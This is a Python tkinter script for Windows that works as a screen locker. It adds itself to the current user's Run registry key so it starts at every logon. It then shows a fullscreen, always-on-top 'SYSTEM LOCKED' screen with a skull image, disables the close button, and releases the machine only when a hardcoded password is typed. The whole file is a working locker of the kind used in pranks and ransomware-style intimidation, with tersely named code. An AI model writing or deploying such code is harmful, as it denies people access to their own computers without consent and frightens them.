import tkinter as t
from tkinter import messagebox as m
import sys,os,winreg as w

P="bini01"
A="MyLockApp"
I="skull.png"

def r(p):
 try:return os.path.join(sys._MEIPASS,p)
 except:return os.path.abspath(p)

def s():
 try:
  with w.OpenKey(w.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,w.KEY_SET_VALUE) as k:
   w.SetValueEx(k,A,0,w.REG_SZ,os.path.abspath(sys.argv[0]))
 except:pass

def u():
 try:
  with w.OpenKey(w.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,w.KEY_SET_VALUE) as k:
   w.DeleteValue(k,A)
 except:pass

def c():
 if e.get()==P:
  u()
  root.destroy()
 else:
  m.showerror("Wrong","Incorrect password")
  e.delete(0,t.END)

s()
root=t.Tk()
root.title("LOCKED")
root.attributes("-fullscreen",True)
root.attributes("-topmost",True)
root.configure(background="black")

try:
 img=t.PhotoImage(file=r(I))
 t.Label(root,image=img,bg="black").pack(pady=20)
except:pass

t.Label(root,text="SYSTEM LOCKED\nEnter password to unlock:",fg="lime",bg="black",font=("Courier",36)).pack(pady=20)
e=t.Entry(root,font=("Courier",30),show="*",fg="lime",bg="black",insertbackground="lime",justify="center")
e.pack(ipady=15)
e.focus()

t.Button(root,text="Unlock",command=c,font=("Courier",24),fg="black",bg="lime").pack(pady=30)

root.protocol("WM_DELETE_WINDOW",lambda:None)
root.mainloop()
